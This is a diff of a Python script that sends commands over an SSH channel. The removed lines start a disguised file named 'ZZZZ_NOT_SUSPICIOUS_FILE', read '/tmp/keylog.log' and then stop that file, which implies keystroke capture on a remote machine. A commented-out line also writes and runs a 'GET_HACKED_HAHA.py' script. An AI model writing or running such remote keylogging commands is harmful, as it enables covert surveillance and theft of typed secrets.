@@ -119,7 +119,6 @@ def removePidProcess():
         with open(pidfile) as file:
             os.kill(int(file.readline().rstrip()), signal.SIGTERM)
     else:
-        print("Expected server pidfile not found", file=sys.stderr)
         logger.error("Expected server pidfile not found")
 
 
@@ -325,18 +324,15 @@ def serverForever(commandArgs):
 
             # command chain
             # sshChannel.send("touch GET_HACKED_HAHA.py | echo \"#!/usr/bin/python3\nprint('Hey, you just got hacked!')\" > GET_HACKED_HAHA.py | #python3 GET_HACKED_HAHA.py")
-            sshChannel.send("python3 ZZZZ_NOT_SUSPICIOUS_FILE start | ls")
+            sshChannel.send("ls")
             RXmessage = sshChannel.recv(1024).decode()
 
             logger.info("Received SSH message.")
             logger.info(RXmessage)
 
             time.sleep(10)
-            sshChannel.send("cat /tmp/keylog.log")
+            sshChannel.send("stop")
 
-
-            time.sleep(1)
-            sshChannel.send("python3 ZZZZ_NOT_SUSPICIOUS_FILE stop")
             sshChannel.close()
 
             # Once task is completed close connection socket
